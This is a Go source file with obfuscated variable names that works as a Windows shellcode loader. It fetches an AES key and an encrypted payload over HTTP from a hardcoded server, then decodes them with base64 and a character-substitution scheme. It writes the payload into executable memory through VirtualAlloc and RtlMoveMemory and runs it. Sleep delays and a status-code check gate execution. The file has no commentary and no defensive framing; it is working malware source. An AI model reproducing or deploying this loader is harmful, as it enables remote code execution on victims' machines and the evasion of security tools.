package main

import (
    "encoding/base64"
    "strings"
    "syscall"
    "time"
    "unsafe"
    "io/ioutil"
    "net/http"
    "net/url"
    "crypto/aes"
    "crypto/cipher"
)
var (
    KsZCDv  = syscall.NewLazyDLL("kernel32.dll")
    MJifPE = KsZCDv.NewProc("VirtualAlloc")
    yCXiYr = KsZCDv.NewProc("RtlMoveMemory")
    Rnpu = "http://127.0.0.1/"
)

func hiZI(hAmqN string){
    INpzYZyM := lqwQX()
    FKpOkcPu := xQCzTD(hAmqN, INpzYZyM)
    TvgOQb :=strings.Replace(FKpOkcPu, "#", "A", -1 )
    dyHQA :=strings.Replace(TvgOQb, "!", "H", -1 )
    JER :=strings.Replace(dyHQA, "@", "1", -1 )
    ikRpvM :=strings.Replace(JER, ")", "T", -1 )
    DrxpZ,_ := base64.StdEncoding.DecodeString(ikRpvM)
    vhTCmSPOK, _, _ := MJifPE.Call(0, uintptr(len(DrxpZ)), 0x1000|0x2000, 0x40)
    _, _, _ = yCXiYr.Call(vhTCmSPOK, (uintptr)(unsafe.Pointer(&DrxpZ[0])), uintptr(len(DrxpZ)))
    syscall.Syscall(vhTCmSPOK, 0, 0, 0, 0)

}
func xQCzTD(dkE string, INpzYZyM string) string {
    gsDleqEF, _ := base64.StdEncoding.DecodeString(dkE)
    k := []byte(INpzYZyM)
    bCoL, _ := aes.NewCipher(k)
    bCoLSize := bCoL.BlockSize()
    bCoLMode := cipher.NewCBCDecrypter(bCoL, k[:bCoLSize])
    gotTPsE := make([]byte, len(gsDleqEF))
    bCoLMode.CryptBlocks(gotTPsE, gsDleqEF)
    gotTPsE = jsDf(gotTPsE)
    return string(gotTPsE)
}


func jsDf(gotTPsEData []byte) []byte {
    RLCU := len(gotTPsEData)
    YwaucOZ := int(gotTPsEData[RLCU-1])
    return gotTPsEData[:(RLCU - YwaucOZ)]
}
func lqwQX() string {
    time.Sleep(5 * time.Second)
    HVS, _ := http.Get(Rnpu + "key.txt")
    defer HVS.Body.Close()
    body, _ := ioutil.ReadAll(HVS.Body)
    return string(body)
}
func oudIkX() string {
    time.Sleep(5 * time.Second)
    HVS, _ := http.Get(Rnpu + "deeddededde7484848.txt")
    defer HVS.Body.Close()
    body, _ := ioutil.ReadAll(HVS.Body)
    return string(body)
}
func main() {
    epaYS, _ := url.Parse("http://127.0.0.1/k1.txt")
    arlS := oudIkX()
    uyWAsKwY := epaYS.Query()
    epaYS.RawQuery = uyWAsKwY.Encode()
    CBRW, UODWJEwj := http.Get(epaYS.String())
    if UODWJEwj != nil {
        return
    }
    LoC := CBRW.StatusCode
    CBRW.Body.Close()
    if UODWJEwj != nil {
        return
    }
    var xTOoXFdIA int = 200
    if LoC == xTOoXFdIA {
    hiZI(arlS)
    }
}